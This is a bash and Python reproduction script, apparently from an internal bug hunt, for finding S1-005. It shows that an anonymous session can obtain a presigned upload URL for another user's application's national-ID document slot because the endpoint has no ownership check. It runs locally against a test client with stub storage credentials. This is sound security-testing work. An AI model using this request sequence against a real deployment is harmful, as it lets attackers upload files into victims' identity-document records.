#!/usr/bin/env bash
# S1-005 — POST /v2/documents/presign accepts an arbitrary application_id from
# the request body and signs an upload URL scoped to it, with no ownership check.
#
# The same API checks ownership correctly one file over:
#   app/api/stream.py:144   if not await turn_service.owns_thread(thread_id, owner_id):
# There is no owns_application() anywhere in the codebase.
#
# Object storage is not configured in this environment, so the route would 503
# before signing. This repro therefore supplies a stub S3 config, which changes
# nothing about the authorisation path under test -- it only lets the signature
# actually be produced so the resulting key can be printed.
#
# SAFETY: no real bucket, no real credentials, DATABASE_URL is the scratch
# container. Nothing leaves this machine.
#
#   bash bug-hunt/repro/S1-005-presign-foreign-application.sh
set -u
cd "$(dirname "$0")/../../backend" || exit 1

DATABASE_URL="postgresql://bughunt:bughunt@127.0.0.1:55433/aspire_bughunt" \
SESSION_SECRET="bughunt-scratch-secret-not-production-32bytes" \
VALKEY_URL="redis://127.0.0.1:6380/9" \
S3_ENDPOINT="https://s3.example.invalid" \
S3_BUCKET="aspire-docs-stub" \
S3_REGION="us-east-2" \
S3_ACCESS_KEY_ID="AKIASTUBSTUBSTUBSTUB" \
S3_SECRET_ACCESS_KEY="stub-secret-not-a-real-credential" \
.venv/Scripts/python.exe - <<'PY'
import logging; logging.basicConfig(level="CRITICAL")
from fastapi.testclient import TestClient
from app.main import app

VICTIM_APPLICATION = "11111111-1111-1111-1111-111111111111"

with TestClient(app, raise_server_exceptions=False) as c:
    # 1. Anyone may mint a graph session. No account, no proof of anything.
    s = c.post("/v2/session", json={"device_id": "attacker-device", "locale": "en"})
    print(f"[1] POST /v2/session               -> {s.status_code}")
    token = (s.json() or {}).get("token")
    if not token:
        print("    could not mint a session; body:", str(s.text)[:200]); raise SystemExit(1)
    print(f"    got a session token (anonymous, unauthenticated)")

    # 2. Ask for an upload URL scoped to an application id we do not own.
    r = c.post(
        "/v2/documents/presign",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "application_id": VICTIM_APPLICATION,   # <-- attacker-supplied
            "slot": "national_id",
            "mime": "image/jpeg",
            "size": 1024,
        },
    )
    print(f"[2] POST /v2/documents/presign     -> {r.status_code}")
    body = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
    url = body.get("url", "")
    print(f"    document_id: {body.get('document_id')}")
    print(f"    signed key : {url.split('?')[0][-90:] if url else '(none)'}")

    if VICTIM_APPLICATION in url:
        print()
        print("    >>> CONFIRMED: the signed URL is scoped to an application id")
        print("    >>> the caller supplied and does not own. No check was made.")
    elif r.status_code == 503:
        print("    (503: storage unconfigured — rerun with S3_* set to see the key)")
PY
